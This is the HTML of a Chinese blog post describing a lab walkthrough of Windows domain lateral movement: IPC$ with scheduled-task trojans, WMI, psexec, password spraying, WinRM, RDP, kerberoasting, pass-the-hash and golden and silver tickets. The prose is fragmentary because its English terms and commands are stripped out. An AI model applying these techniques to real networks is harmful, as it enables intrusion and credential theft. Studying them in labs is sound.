<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>横向移动 | VV</title><meta name="keywords" content="学习,内网,渗透,横向移动"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="横向移动"><meta name="application-name" content="横向移动"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="横向移动"><meta property="og:url" content="http://cszvvds.cc/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="横向移动IPC横向移动之前靶场学习 拓扑图  信息收集cs上线webserver  先看下他是不是内网用户 shell net user &amp;#x2F;domain  是 且域内用户： Administrator            boss                     dbadmin"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="横向移动IPC横向移动之前靶场学习 拓扑图  信息收集cs上线webserver  先看下他是不是内网用户 shell net user &amp;#x2F;domain  是 且域内用户： Administrator            boss                     dbadmin"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: '横向移动',
  postAI: '',
  pageFillDescription: '横向移动, IPC, 横向移动之前, 信息收集, 提权, 凭证抓取, IPC横向移动, 建立IPC连接到目标, 拷贝要执行的木马到目标主机, IPC连接拷贝, 计划任务执行木马, 正向连接上线, 反向连接上线, 插件IPC移动, IPC常见报错, 套件-impacket-ipc, socks代理, WMI, 命令执行, 套件执行, 插件执行, 脚本执行, kali自带pth执行, SMB, psexec, impacket套件, SMBexec, 密码喷洒, linux代理, 工具使用, 密码喷洒域登录, 本地登录, 本地登录执行命令, WinRM, Winrs, Winrm, RDP, C2横向, gotohttp, RustDesk, kerberos协议, 简单学习, kerberoasting攻击, PTH, 前置, PTH, mimikatz进行PTH攻击, impacket进行PTH攻击, psexec, smbexec, wmiexec, crackMapExec-PTH, PTK, PTT, MS14068, KEKEO, mimikatz, 黄金票据, 简介, 利用条件, 利用, 域名, 域的SID值, 域的KRBTGT账户hash, 伪造用户, 导入票据, 白银票据, 简介, 利用条件, 利用, 域名, 域SID, 目标服务器FQDN, 可利用的服务, 抓服务账号hash, 伪造用户, 黄金票据与白银票据区别横向移动横向移动之前靶场学习拓扑图信息收集上线先看下他是不是内网用户是且域内用户且域控命令确定域控域控端口扫描一下不知道为什么没有扫出来问题不大提权简单提下权因为这里重点是学习横向移动所以提权就简单一点总之就是要拿到权限提权成功因为是本地靶场就不权限维持了凭证抓取为了更好的在域内进行横向渗透我们需要抓取凭证这里使用抓用的权限抓抓取和抓取明文密码都可以他们调用的都是猕猴桃工具抓到把也抓了不管是抓到明文密码还是都是可以进行传递的横向移动做好了前面的一系列前置操作后我们就可以对域控进行攻击了这里我们用到的是横向移动协议是指用于不同进程之间进行通信和数据交换的协议在操作系统中进程是指正在运行的程序的实例进程可以是同一应用程序的不同实例也可以是不同应用程序之间的独立实例进程之间的通信是实现多任务协作和数据交换的关键协议提供了一套规范和机制使不同进程能够安全可靠地进行通信它允许进程之间共享数据传递消息进行同步操作等常见的协议包括以下几种管道管道是一种半双工的通信机制可用于在父子进程或者兄弟进程之间进行通信在和系统中管道可以通过创建一个管道文件描述符来实现进程间通信命名管道命名管道是一种有名的管道它允许无亲缘关系的进程进行通信命名管道在文件系统中有一个唯一的名字进程可以通过该名字打开和使用管道进行通信消息队列消息队列是一种按照消息进行通信的机制进程可以将消息发送到消息队列中其他进程可以从队列中接收和处理消息消息队列通常具有先进先出的特性并提供了一种异步通信的方式共享内存共享内存允许不同进程访问同一块内存区域从而实现高效的数据共享多个进程可以将共享内存映射到各自的地址空间中以便直接读写共享数据避免了数据复制和传输的开销套接字套接字是一种网络编程中常用的机制它允许不同主机上的进程进行网络通信套接字提供了一种可靠的面向连接的通信方式可以通过或协议在网络中传输数据信号量信号量是一种用于同步进程的机制它可以用来保护共享资源控制进程的访问顺序以及实现进程间的互斥和同步操作总之我们可以通过对目标发起一个管道链接我们可以通过这个管道链接对目标进行一些操作使用流程建立连接到目标拷贝要执行的木马到目标主机执行木马计划任务删除建立连接到目标计划任务打建立连接这里的用户密码都是的拷贝执行文件到目标机器获取服务器时间添加计划任务正向连接木马计划任务打建立连接复制文件到其盘创任务对应执行文件运行任务删除任务建立连接看下连没连上好但是现在我们是不能直接用木马让连接到因为不出网但是是可以和正常通信的所以我们要用主机作为跳板让连接它再间接连接到我们的卡新建一个正向监听生成木马注意这里要生成无状态可执行程序区分无状态可执行程序可执行程序首先生成的为是一个小程序通常是手工优化的汇编指令用于远程下载一个将其注入到当前被执行服务器内存对其传达指令靶机向服务器发送了一个下载请求请求下载真正的为部分阶段的所有指令都集成到了里面它生成一个叫双击运行后我们并不会在日志中看到任何请求信息因为会将所有的利用代码一开始就集中到了拷贝要执行的木马到目标主机连接拷贝先把我们的弄到主机上然后用命令拷贝拷到盘当然也可以加上路径计划任务执行木马正向连接上线首先我们需要获取一下服务器的时间根据时间我们添加一下计划任务等待计划任务执行因为我们开的的正向连接的木马所以我们要用去绑定端口直接上线反向连接上线当然因为和是互通的我们也可以用反向连接的权限转发上线来建监听器配置一下生成木马并上传到拷贝过去计划任务执行一下环境问题这里我没有上线成功但是是可以上线的插件移动插件内置了移动拿下后就可以随便打了这里我们打一下连接建立成功常见报错拒绝访问可能是使用的用户不是管理员权限需要先提升权限网络问题无法找到网络路径找不到网络路径可能是地址错误目标未开机目标服务未启动有防火墙等问题找不到网络名本地主机中服务未启动或者目标主机删除了提供的凭据和已存在的凭据集冲突说明已建立需要先删除账号密码错误目标服务未启动连接域控常常会出现此情况用户密码过期目标有账号策略强制定期更改密码套件本身它需要有环境才能执行这里我们用魔改版里面有很多程序我们用第一个就行先把文件传到上去使用命令本地用户明文连接域内用户明文连接域内本地用户明文密文连接本地用户传递域用户传递这里的第二个表示本地如果是域的话要用域名根据命令我们抓到的也是可以传递执行命令的工具生成一下命令随便找个的命令这个是一个基于的反向连接的木马将换成我们生成的命令成功执行木马上线这也就是通过下载文件的形式来进行横向移动但是他也有弊端上传套件套件比较大容易被杀软识别使用脚本可能目标没有环境解决代理使用节点可实现无文件落地在与本地上建立节点这样本地就会映射到那么就意味着我们无需将我们需要的文件放到域内就可以使用配置一下连接这里的是的再建立一个新规则任何只要是的都会把流量转发到代理服务器这样本地就可以直接访问内网了这样的话我们就可以直接在本地执行套件了找到刚才那个的脚本成功脚本批量执行下载木马并执行下载后门执行后门管理规范是一项核心的管理技术从开始操作系统都支持用户可以通过管理本地和远程计算机为远程传输数据提供了两个可用的协议即分布式组件对象模型和远程管理使得对象的查询事件注册类方法的执行和类的创建等都可以远程执行利用进行横向移动需要具备以下条件远程主机的服务为开启状态默认开启远程主机防火墙放行端口这是管理的默认端口支持明文以及利用不会再目标的系统日志留下痕迹命令是没有回显的环境还是的那个环境具体渗透就不多说了总之用上线权限其他网段都是域内主机命令执行因为是主机自带的所以我们不需要向目标上传任何额外文件可以直接执行命令查进程下载木马执行木马上线解决无回显可以将执行结果写入文件然后建立连接来远程读取结果写入文件建立读文件或者将木马传输和执行一起执行看上不上线套件执行我们在用到套件也是支持的代理会更快点这也是代理的优势插件执行本身是可以进行横向移动的目标列表中也是被插件支持的两个都差不多脚本执行脚本如下命名成把脚本上传到目标服务器可以看到会生成一个交互式且与交互有一个问题就是不支持交互式所以这个脚本利用面比较窄自带执行工作组环境下本地管理员域环境下域管用户是文件共享服务通过端口进行的可以直接用的端口扫描看下端口开没开同样它也是支持和明文传递的是微软官方提供的一个远程控制工具可以根据凭据在远程系统上执行管理操作并且可以获得与命令行几乎相同的实时交互性的原理是通过连接到服务端的共享并释放名为的二进制文件然后注册名为服务当客户端执行命令时服务端通过服务启动相应的程序执行命令并回显数据运行结束后服务会被删除使用进行远程操作需要以下条件远程主机开启了共享远程主机未开启防火墙或放行了端口用微软自带工具可以绕过免杀直接到微软官网上去下就行因为它也是的形式用不太行所以我们用节点打过去套件还是走代理比较好我这里好像代理一直有点问题一直拒绝访问但是命令是没问题的呃又好了同样是用中的来里面有一个只要能执行命令那么就可以通过下载执行木马的形式执行对应的木马密码喷洒尝试使用已经获取的已经明文密码对于域内所有主机进行相应的登录尝试这就是密码喷洒工具下载命令代理需要下载好然后我们需要配置一下找到配置文件地址编辑这里是是因为我们服务端在本地而下的配置是我的我们把它的端口改成的代理的端口然后就可以来下载工具使用密码喷洒域登录但是我们不能直接在上用因为和域内主机不在同网段连不上所以我们必须用代理这样就行登不上去本地登录多了一个登录成功会有这个绿色的本地登录执行命令多了一个他会在最后把所以能执行命令的主机的执行结果汇总本地登录命令执行上线就是把改成一个下载命令再执行也可进行爆破就是把和后面跟上字典就像密码喷洒域登录命令执行上线少了一个密码喷洒本地域登录命令执行全自动上线域本地是对协议的实现协议即一种基于标准简单对象访问协议的防火墙友好协议它让来自不同供应商的硬件和操作系统能够相互操作众多可以远程执行命令方式中的一种作为和远程管理的替代方法用于通过与远程计算机建立会话利用作为传输机制来传递格式的消息在现代系统中通过端口进行通信而通过端口进行通信远程管理是一种允许管理员远程执行系统管理任务的服务以上默认是自动以上手动启动默认都是允许远程任意主机进行管理查询本机的状态开启服务自动添加防火墙例外规则放行端口扫描一下端口也就是三台主机开了端口远程管理工具提供了两个命令行工具用于远程管理允许远程执行命令的命令行工具利用协议内置系统管理命令行工具允许管理员配置本机的服务所以执行命令咦报错排查了很久感觉可能是的问题但是在主机内是可以执行的那我们用就行也就是转给在里然后运行在里执行命令就行既然可以执行任意命令那么我们就可以让他远程下载木马并执行这样就可以上线了把生成的正向木马放到的目录里执行命令已下载并成功执行上线了就简单了因为是正向连接所以我们要绑定一下端口然后就会上线了本身可以直接生成一个计算器当然也可以生成服务生成名为的服务远程调用该服务执行匿名服务器中的后门文件就是远程桌面协议默认监听端口为通过已获得的凭据进行代理登录远程主机并进行实时操控但是可能导致对方用户强行下线易被发现还是先看看开没开连接不仅支持明文也支持连接的桌面交换其实就是基于的本身的也是一样的这些都是明文连接连接要抓下密码要管理员权限横向命令与控制主要是指攻击者通过与恶意软件的交互对被害者进行控制从而实施恶意活动的含义下面这两个都是远程协助软件走的是协议目标网络情况能出网没有限制能直接用能出网有限制端口不限制就行不出网有限制不限制就行优点模式不需要安装软件有浏览器就行走的是协议只要放行端口就可以实现内网穿透缺点必须要有网络不限制网络唤醒远程主机的时候安全卫士可能拦截我们需要把文件放到目标主机上方法很多就不多说了可以看到很小运行程序会生成控制码于这个软件在开完后会在当前路径中生成一个配置文件路径里面有我们需要的信息直接通过它给的这个连接浏览器访问连接连上了优点无网络不出网情况下也可以用把传入目标电脑因为这是一个远程协助的工具所以会被杀软列入白名单同样他也会有配置文件本地存放路径用户名配置文件就是就是密码如果是出网的情况下我们就直接在本地开一个客户端进行远连就行如果是不出网的话我们只需要找一个能与他进行通信的主机就可以了我们选哟更改一下配置文件添加我们直接用同网段的主机连就行注意配置文件里的要是真协议简单学习学习认证学习简单理解当你在进行安全访问时就会用到协议认证服务器在验证身份后会发一张票证将交给票据授权服务器通过后会通过获取访问端的票据这样就可以正常访问了攻击扫描服务主体名称他是域内服务的唯一标识每一个服务都会有一个服务在加入域的时候也会自动注册一个都会有对应的使用场景我们在没有办法获取到域内其他主机的凭据信息抓不到时就可以采用也就是请求对应的服务获取服务的凭据抓凭据再将服务凭据导入本地进行破解凭据加密类型扫描扫全部扫工具检测把这个文件放到目标主机上然后执行命令就行这样我们就直接找到了凭据加密类型是的先请求到票据查看票据但是现在这些票据都不是我们需要的清除票据请求好退出我们再看看票据已经有新票证生成第一个票证是加密的我们用不了第二个就是加密的可用导出票据它会把票证导到的路径下把我们需要的票证放到的文件夹里直接用它内置的脚本凭证名字典名凭证名是一个字典前置要学习需要知道一些认证的相关只是认证认证本地有个存密码的地方这个里面存放着密码的在里面密码的称之为在协议存在之前他的前身叫协议两个的差别在于加密方式不同协议更容易被破解协议是一种网络认证协议它是基于挑战相应认证机制的一种认证模式它只支持哈希传递通过密码散列值通常是来进行攻击是能够在不需要账户明文密码的情况下完成认证的一种技术它解决了我们渗透中获取不到明文密码破解不了而又想扩大战果的问题在域环境中用户登录计算机时使用的账号计算机会用相同的本地管理员账号和密码两个账号密码类似因此如果计算机的本地管理员账密是相同的我们就可以使用哈希传递的方法登录到内网的其他主机之前或之后进行攻击需要交互式通信是在本地但是我们有凭证可以直接查看目标根目录复制文件进行攻击套件可以在上执行所以上传代理无文件落地先建立代理代理配置使用套件的已进入其他服务同理这是那个密码喷洒的工具它同样可以进行攻击密码喷洒域用户登录域用户登录本地用户登录当系统安装了补丁并且禁用的时候虽然此时我们抓取到的就失效了但是可以通过进行攻击未找到相应环境获取域用户名域名值有三种攻击方式漏洞自己做一张票据只需要普通用户权限就可以实施攻击服务密钥分发中心的漏洞原理它允许身份验证的用户在票证里面插入任意的用户可以通过呈现具有改变的的来获得票证首先我们需要的值这里的是我们可以基于这个值在本地生成一个票据文件上找一个的用户和域名这个用户对应的值域控对应内网用户对应密码可以看到已经生成了一个查看一下当前票据现在是没有的好先把我们本地生成的传到我们已控制的主机上来这里是但是现在的票据还只是在主机的文件夹里我们通过导入文件名好这样的话就注入成功了看下票据已经有了新票据读一下域控盘访问成功清空票据但是域控如果打过对应的漏洞补丁那这种方法就不行了拿下域控就好说了可以直接命令过来了要求高权限原理因为当前主机在以前的时间内肯定会和其他主机产生过连接所以本地应该就生成了一些票据我们可以导出这些票据然后再导入这些票据进行利用缺点票据是有有效期的如果在有效期内连接过域控的话就可以使用这些票据首先我们先把这个工具传到我们控制的上导出票据和都会进入到工具里面然后再输入命令执行所以这里我们直接加一个让他执行完命令后退出这个哈希就是这个在域内的执行成功可以看到在的桌面上多了两个票据文件导入这个的票据这里我们还是使用这个来导入票据当然你用也是一样的可以看到成功也有票了有票了那么访问也是没有问题的了只要我们抓到一张域控的票那么域内所有主机都可以通过这个票访问到同样可以抓到历史票据但是不知道票据是否过期导出票据导入票据其他的一样了黄金票据简介实际上黄金票据和白银票据都是在权限维持里黄金票据就是伪造用户的票据用户是域控中用来管理发放票据的用户拥有了该用户的权限就可以伪造系统中的任意用户且黄金票据不会受到生命周期的影响默认小时最长续订一周利用条件拿到域控适合做权限维持有用户这是一个域控用户的值等后面要指定一下算法利用先拿到我们需要的域内信息域名这个随便获取就不多说了域的值注意这个最后面这个表示的是这个用户所以域的值要把去掉三种方法都可以包括插件都可以域的账户直接抓密码先开权限然后就可以抓了找到还可以指定查用户伪造用户我们可以伪造域内任意用户除了看下域内用户比如说这里我们伪造一下需要伪造的用户域名域用户的哈希生成的票据名称好我们生成票据是不需要高权限的这个是票据的默认后缀加不加无所谓生成成功导入票据用导入票据即可访问域控成功本身也可以生成黄金票据白银票据简介黄金票据是伪造门票发放票而白银票据则是伪造门票这样的好处是门票不会经过从而更加隐蔽但是伪造的门票只对部分服务起作用如文件共享服务远程管理等等利用条件拿下域控利用域名同样的就不多说了域三个命令都可以目标服务器就是目标计算机的全名注意计算机名是计算机名计算机全名是计算机全名可利用的服务根据这个图来比如说磁盘共享服务这个一般都是开着的抓服务账号还是就行开抓我们需要的域内账户名字是带有的需要的是指定机器的通常情况下本地机器的名后面会带有一个伪造用户同样是伪造任意用户这里我们还是伪造域名域目标计算机全名服务账号的可利用的服务要伪造的用户这里的就是生成了票据后自动导入我们也可以用黄金票据那个指定名字生成在本地再自己导入但是白银票据是收到票据周期的影响的可以看到票已经过来了成功访问到域控黄金票据与白银票据区别获取的权限不同黄金票据是直接抓取域控中账号的来在端生成一个票据那么该票据是针对所有机器的所有服务白银票据实际就是在抓取到了域控服务的情况下在端以一个普通域用户的身份生成票据并且是针对于某个机器上的某个服务的生成的白银票据只能访问指定的机器中指定的服务认证流程不同黄金同交互但不同交互白银不同交互直接访问加密方式不同黄金由加密白银由服务账号加密域委派攻击好项目整个内网学下来还是挺会的但又不是那么会而且肯定不会太符合红队的无感渗透很多情况下都会用到工具线程也太大了而且这个横向移动没有权限提升和权限维持学的深刻有些地方没有深入的学就比如说协议啊这种更多的偏向是使用工具怎么打后续还会补充学习这边',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-11 22:24:57',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 1.05rem;">CC链<sup>7</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>2</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>2</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>13</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>13</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>9</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>9</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>15</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>26</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">提权<sup>3</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 1.05rem;">横向移动<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">渗透<sup>15</sup></a><a href="/tags/%E7%BB%B4%E6%9D%83/" style="font-size: 1.05rem;">维权<sup>5</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont 